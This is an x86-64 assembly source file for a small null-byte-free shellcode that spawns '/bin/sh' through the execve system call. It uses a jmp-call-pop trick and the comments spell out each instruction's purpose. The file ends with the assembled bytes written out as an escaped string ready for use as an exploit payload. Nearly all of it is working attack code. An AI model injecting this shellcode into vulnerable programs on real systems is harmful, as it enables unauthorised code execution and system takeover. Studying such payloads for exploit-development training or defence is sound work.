;;;;;;;;________````````,,,,,,,,========::::::::>>>>>>>>////////
SECTION .text
GLOBAL	_start
;;;;;;;; . . . .========, , , , * * * * ========_ _ _ _ ;;;;;;;;
_start:	nop;
;;;;;;;; - - - -_ _ _ _ * * * * ========, , , ,  . . . .` ` ` `
	jmp	spring;
execve:	pop 	rdi; now we have the address of "/bin/sh" string
	xor	rax, rax; a multipurpose move
	push	rax; NULL
	push	rdi; argv[0]
	mov	rsi, rsp; that will be argv itself
	mov	rdx, rax; again NULL, for environment variables
	mov	al, 59; dodging the zeroes( sys_execve )
	syscall; Au Revoir
spring:	call	execve;
	db	"/bin/sh", 0;
;;;;;;;;<<<<<<<<========********!!!!!!!!<<<<<<<<,,,,,,,,;;;;;;;;
;;;;     "\xEB\x10"
  ;;;;;; "\x5F"
;;;;;;;; "\x48\x31\xC0"
  ;;     "\x50"
  ;;;;;; "\x57"
;;;;     "\x48\x89\xE6"
 ;;;;    "\x48\x89\xC2"
;;;;;;   "\xB0\x3B"
   ;;;;; "\x0F\x05"
;;;;;;   "\xE8\xEB\xFF\xFF\xFF"
;;;;;;;; "/bin/sh"
